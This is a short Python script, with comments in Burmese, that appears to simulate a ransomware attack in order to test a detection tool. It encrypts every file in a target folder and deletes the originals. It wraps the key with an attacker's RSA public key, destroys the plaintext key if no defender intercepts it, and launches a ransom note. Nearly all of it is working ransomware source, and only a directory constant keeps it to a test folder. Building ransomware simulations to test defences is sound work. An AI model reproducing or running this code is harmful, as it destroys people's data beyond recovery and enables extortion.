import os
import glob
import time
import json
import subprocess
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization

TARGET_DIR = "test_files"
PUBLIC_KEY_PATH = "keys/public_key.pem"
TEMP_KEY_FILE = "captured_keys.json"

def run_attack():
    if not os.path.exists(PUBLIC_KEY_PATH):
        return

    with open(PUBLIC_KEY_PATH, "rb") as f:
        public_key = serialization.load_pem_public_key(f.read())

    # 1. Generate Plaintext AES Key
    aes_key = Fernet.generate_key()
    fernet = Fernet(aes_key)

    # [RAM Interception Simulation]
    # Defender က ဖမ်းယူနိုင်ရန်အတွက် AES Plaintext Key ကို Memory Buffer/Temp File ပေါ်တွင် စက္ကန့်ပိုင်း တင်ထားမည်
    with open(TEMP_KEY_FILE, "w") as f:
        json.dump({"intercepted_key": aes_key.decode()}, f)

    # 2. Encrypt AES Key with Attacker's RSA Public Key
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    key_out_path = os.path.join(TARGET_DIR, "encrypted_aes_key.bin")
    with open(key_out_path, "wb") as f:
        f.write(encrypted_aes_key)

    # 3. Canary ဖိုင်နှင့် အခြားဖိုင်များကို စတင် Encrypt လုပ်မည်
    files_to_encrypt = sorted(glob.glob(os.path.join(TARGET_DIR, "*")))
    
    for file_path in files_to_encrypt:
        if file_path.endswith(".locked") or file_path.endswith(".bin"):
            continue
        try:
            with open(file_path, "rb") as f:
                data = f.read()

            encrypted_data = fernet.encrypt(data)

            with open(file_path + ".locked", "wb") as f:
                f.write(encrypted_data)

            os.remove(file_path)

            # Defender Detection မိစေရန် အနည်းငယ် စောင့်မည်
            time.sleep(0.1)

        except Exception:
            pass

    # [Defender OFF Handling]
    # Defender မဖွင့်ထားပါက (Attack အပြည့်အဝ အောင်မြင်သွားပါက) 
    # RAM ပေါ်မှ Plaintext Key ကို အပြီးတိုင် ဖျက်ဆီးပစ်မည်။ (Decrypt လုပ်၍ မရတော့ပါ)
    if os.path.exists(TEMP_KEY_FILE):
        os.remove(TEMP_KEY_FILE)

    # Attack အစအဆုံး အောင်မြင်မှသာ Ransom Note တက်မည်
    if os.path.exists("ransom_note.py"):
        subprocess.Popen(["python3", "ransom_note.py"])

if __name__ == "__main__":
    run_attack()